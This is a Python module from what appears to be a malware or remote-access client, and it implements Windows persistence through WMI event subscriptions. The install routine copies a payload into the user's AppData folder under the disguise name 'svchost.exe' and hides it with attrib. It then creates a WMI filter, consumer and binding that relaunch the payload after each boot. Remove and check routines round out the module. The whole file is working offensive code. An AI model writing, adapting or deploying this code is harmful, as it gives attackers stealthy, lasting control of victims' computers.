import os
import subprocess

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class WMIPersistence(PersistenceMethod):
    name = 'wmi'

    def install(self, event_name: str = 'SystemService', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            appdata = os.environ.get('appdata', os.path.expanduser('~'))
            file_location = os.path.join(appdata, payload_name)

            _copy_payload(file_location)
            self._hide_file(file_location)

            filter_result = subprocess.run(
                f'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE '
                f'Name="{event_name}_filter", QueryLanguage="WQL", '
                f'Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 '
                f'WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' '
                f'AND TargetInstance.SystemUpTime >= 120"',
                shell=True, capture_output=True, text=True, timeout=15,
            )

            if 'already exists' in filter_result.stderr.lower() + filter_result.stdout.lower():
                return PersistenceResult(
                    True, 'wmi',
                    f'[+] WMI persistence already exists: {event_name}'
                )

            consumer_result = subprocess.run(
                f'wmic /namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE '
                f'Name="{event_name}_consumer", ExecutablePath="{file_location}", '
                f'CommandLineTemplate="{file_location}"',
                shell=True, capture_output=True, text=True, timeout=15,
            )

            bind_result = subprocess.run(
                f'wmic /namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE '
                f'Filter="__EventFilter.Name=\\"{event_name}_filter\\"", '
                f'Consumer="CommandLineEventConsumer.Name=\\"{event_name}_consumer\\""',
                shell=True, capture_output=True, text=True, timeout=15,
            )

            return PersistenceResult(
                True, 'wmi',
                f'[+] WMI persistence installed: {event_name}',
                file_location,
                'WMI event subscription created'
            )
        except Exception as e:
            return PersistenceResult(False, 'wmi', f'[-] WMI error: {str(e)}')

    def remove(self, event_name: str = 'SystemService', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            subprocess.run(
                f'wmic /namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding '
                f'WHERE "Filter=\\"__EventFilter.Name=\'{event_name}_filter\'\\" AND '
                f'Consumer=\\"CommandLineEventConsumer.Name=\'{event_name}_consumer\'\\"" DELETE',
                shell=True, capture_output=True, timeout=15,
            )
            subprocess.run(
                f'wmic /namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer '
                f'WHERE "Name=\'{event_name}_consumer\'" DELETE',
                shell=True, capture_output=True, timeout=15,
            )
            subprocess.run(
                f'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter '
                f'WHERE "Name=\'{event_name}_filter\'" DELETE',
                shell=True, capture_output=True, timeout=15,
            )
            try:
                appdata = os.environ.get('appdata', os.path.expanduser('~'))
                os.remove(os.path.join(appdata, payload_name))
            except Exception:
                pass
            return PersistenceResult(True, 'wmi', f'[+] WMI persistence removed: {event_name}')
        except Exception as e:
            return PersistenceResult(False, 'wmi', f'[-] WMI remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            result = subprocess.run(
                'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter GET Name /format:list',
                shell=True, capture_output=True, text=True, timeout=10,
            )
            entries = [l for l in result.stdout.split('\n') if l.strip() and 'Name=' in l]
            if entries:
                return PersistenceResult(True, 'wmi', f'[+] Found {len(entries)} WMI filters', details='\n'.join(entries))
            return PersistenceResult(True, 'wmi', '[-] No WMI event subscriptions found')
        except Exception:
            return PersistenceResult(False, 'wmi', '[-] WMI check failed')

    def _hide_file(self, path: str):
        try:
            subprocess.run(f'attrib +h "{path}"', shell=True, capture_output=True)
        except Exception:
            pass
